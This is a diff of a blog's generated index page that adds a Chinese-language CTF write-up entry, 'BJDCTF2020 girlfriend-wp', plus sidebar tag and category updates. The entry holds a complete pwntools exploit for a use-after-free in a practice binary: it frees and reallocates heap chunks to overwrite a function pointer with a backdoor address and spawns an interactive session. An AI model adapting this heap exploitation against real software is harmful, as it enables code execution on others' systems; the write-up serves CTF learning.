@@ -131,6 +131,34 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/06/12/BJDCTF2020-girlfriend-wp/" >BJDCTF2020 girlfriend-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-06-12
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="use-after-free"><a href="#use-after-free" class="headerlink" title="use after free"></a>use after free</h2><p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/12/BJDCTF2020-girlfriend-wp">相关资源</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pty = process.PTY</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./girlfriend&quot;</span>, stdin=pty, stdout=pty)</span><br><span class="line"><span class="comment"># proc = remote(&quot;node2.anna.nssctf.cn&quot;, 28783)</span></span><br><span class="line">belf = ELF(<span class="string">&quot;./girlfriend&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/ctf/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size is :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;name is :&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlt</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shw</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b add_girlfriend</span></span><br><span class="line"><span class="string">    b del_girlfriend</span></span><br><span class="line"><span class="string">    hook-bins</span></span><br><span class="line"><span class="string">    memory watch 0x00000000006020A0 6 qword</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(proc, gdbscript=gscript)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0000000000400B9C</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(backdoor))    <span class="comment">#add时先分配 struc_ptr 再分配 name_ptr</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(backdoor))</span><br><span class="line">dlt(<span class="number">0</span>)      <span class="comment"># delete的时候先free  name_ptr 再free struc_ptr</span></span><br><span class="line">dlt(<span class="number">1</span>)      <span class="comment"># 所以name_ptr 先进入fastbin</span></span><br><span class="line"><span class="comment"># 两次delete结束后fastbin: </span></span><br><span class="line"><span class="comment"># [0x20] chunk3(struc_ptr) -&gt; chunk1(struc_ptr) -&gt; chunk2(name_ptr)</span></span><br><span class="line"><span class="comment"># [0x30] chunk4(name_ptr)</span></span><br><span class="line"><span class="comment"># 再次add, chunk1 会被当做 name_ptr</span></span><br><span class="line"><span class="comment"># 这样就可以复写它的 func_ptr, 再执行show，就执行了后门函数</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(backdoor))</span><br><span class="line">shw(<span class="number">0</span>)</span><br><span class="line">pi()</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2023/06/12/BJDCTF2020-girlfriend-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/06/03/flutterror-wp/" >ciscn2023 flutterror writeup</a>
 								</h3>
 							</div>
@@ -423,9 +451,11 @@
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
+			<li><a href="/categories/pwn-wp/nssctf/">nssctf<span>1</span></a></li>
+		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>1</span></a></li>
 		
-			<li><a href="/categories/pwn-wp/">pwn-wp<span>1</span></a></li>
+			<li><a href="/categories/pwn-wp/">pwn-wp<span>2</span></a></li>
 		
 			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
 		
@@ -440,13 +470,17 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/reverse/">reverse<span>4</span></a></li>
+			<li><a href="/tags/stack/">stack<span>1</span></a></li>
 		
-			<li><a href="/tags/pwn/">pwn<span>2</span></a></li>
+			<li><a href="/tags/heap/">heap<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>6</span></a></li>
+		
+			<li><a href="/tags/reverse/">reverse<span>4</span></a></li>
 		
 			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>5</span></a></li>
+			<li><a href="/tags/pwn/">pwn<span>3</span></a></li>
 		
 		 
 		</ul>
@@ -458,6 +492,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/06/12/BJDCTF2020-girlfriend-wp/" ><i class="fa fa-file-o"></i>BJDCTF2020 girlfriend-wp</a>
+      </li>
     
       <li>
         <a href="/2023/06/03/flutterror-wp/" ><i class="fa fa-file-o"></i>ciscn2023 flutterror writeup</a>
@@ -473,10 +511,6 @@
     
       <li>
         <a href="/2023/06/01/ida-gdb/" ><i class="fa fa-file-o"></i>IDA远程连接gdb调试</a>
-      </li>
-    
-      <li>
-        <a href="/2023/05/31/shellwego-wp/" ><i class="fa fa-file-o"></i>ciscn2023 shellwego writeup</a>
       </li>
     
   </ul>
